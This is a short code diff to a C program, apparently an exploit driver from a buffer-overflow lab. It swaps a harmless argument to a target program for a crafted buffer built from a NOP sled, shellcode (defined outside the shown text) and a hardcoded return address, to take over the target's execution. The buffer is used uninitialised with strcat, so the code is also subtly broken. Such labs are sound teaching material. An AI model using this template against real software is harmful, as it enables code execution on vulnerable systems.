@@ -12,8 +12,18 @@ main ( int argc, char * argv[] )
 	char *	args[3];
 	char *	env[1];
 
+	char buffer[500];
+	char *nop = "\x90";
+	char *return_addr = "\x54\xfe\x21\x30"; // addr of targ at the start of for loop
+
+	for (int i = 0; i < 23; i++)
+		strcat(buffer, nop);
+
+	strcat(buffer, shellcode);
+	strcat(buffer, return_addr);
+
 	args[0] = TARGET;
-	args[1] = "hi there";
+	args[1] = buffer;
 	args[2] = NULL;
 
 	env[0] = NULL;
